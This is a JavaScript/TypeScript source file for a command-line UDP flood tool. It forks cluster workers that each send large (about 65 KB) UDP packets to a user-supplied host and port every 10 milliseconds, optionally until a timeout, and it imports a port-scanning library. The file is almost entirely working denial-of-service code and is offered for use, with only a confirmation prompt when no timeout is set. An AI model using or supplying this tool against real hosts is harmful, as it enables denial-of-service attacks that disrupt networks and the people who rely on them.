const cluster = require('cluster');
let evilscan = require('evilscan');
let dgram = require('dgram');
let program = require('commander');
const Confirm = require('prompt-confirm');
const http = require('http');
const numCPUs = require('os').cpus().length;
const options = {
    target: '127.0.0.1',
    port: '21-23',
    status: 'TROU',
    banner: true
};

let programHelp = program
    .version('0.1.0')
    .option('-h, --host <host>', 'Host Name/IP')
    .option('-p, --port [port]', 'If not defined, program will use random ports.', parseInt)
    .option('-t, --timeout [timeout]', 'Timeout in millisecond. If not defined, it will be unlimited.', parseInt);

programHelp.parse(process.argv);

let tcpPortUsed = require('tcp-port-used');

tcpPortUsed.check(3000, '127.0.0.1')
    .then(function (inUse) {
        console.log('Port 3000 usage: ' + inUse + ' pid: ' + process.pid);
    }, function (err) {
        console.error('Error on check:', err.message);
    });

function udpFlood(ips, port, timeout, pid) {

    let HOST = ips;

    let output = "";
    for (let i = 65500; i >= 0; i--) {
        output += "X";
    }
    let startTime = new Date();
    // You can also pass array of ports to check
    // portScanner.findAPortNotInUse([3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009], '127.0.0.1', function(error, port) {
    //     console.log('PORT IN USE AT: ' + port)
    // })
    // const N = 65535;
    // const numberArray = Array.apply(null, {length: N}).map(Number.call, Number);
    // portScanner.findAPortInUse([3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009]).then(function (port, error) {// ports 0 to 1023 are reserved
    const intervalObj = setInterval(() => {
        if (timeout) {
            let nowTime = new Date();
            if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
                console.log('Timeout Reached for pid: ' + pid);
                clearInterval(intervalObj);
            }
        }
        // const randomPort = Math.floor(Math.random() * (65535) + 1);
        let socket = dgram.createSocket('udp4');
        let message = Buffer.from(output);

        socket.send(message, 0, message.length, port, HOST, function (err, bytes) {
            if (err) throw err;
            console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes message to ' + HOST + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
        });

        socket.on('message', (msg, rinfo) => {
            console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
        });
    }, 10)
}

function start(host: any, port: any, timeout: any) {
    if (cluster.isMaster) {
        console.log(`Master ${process.pid} is running`);

        // Fork workers.
        for (let i = 0; i < (numCPUs / 4); i++) {
            cluster.fork();
        }

        cluster.on('exit', (worker, code, signal) => {
            console.log(`EXITING: worker ${worker.process.pid} died`);
        });
    } else {

        // Workers can share any TCP connection
        // In this case it is an HTTP server
        // http.createServer((req, res) => {
        //     res.writeHead(200);
        //     res.end('hello world\n');
        // }).listen(8000);

        console.log(`Worker ${process.pid} started`);
        udpFlood(host, port, timeout, process.pid);
    }
}

if (program.host) {
    let question = new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ');

    if (!program.timeout) {
        question.ask(function (answer) {
            console.log(answer);
            if (!answer) {
                console.log('Ok, run program again with --timeout parameter.');
                process.stdin.destroy();
            } else {
                start(program.host, program.port, null)
            }
        });
    } else {
        start(program.host, program.port, program.timeout);
    }

} else {
    programHelp.help();
}

// if (process.platform === "win32") {
//     var rl = require("readline").createInterface({
//         input: process.stdin,
//         output: process.stdout
//     });
//
//     rl.on("SIGINT", function () {
//         process.emit("SIGINT");
//     });
// }
//
// process.on("SIGINT", function () {
//     //graceful shutdown
//     process.exit();
// });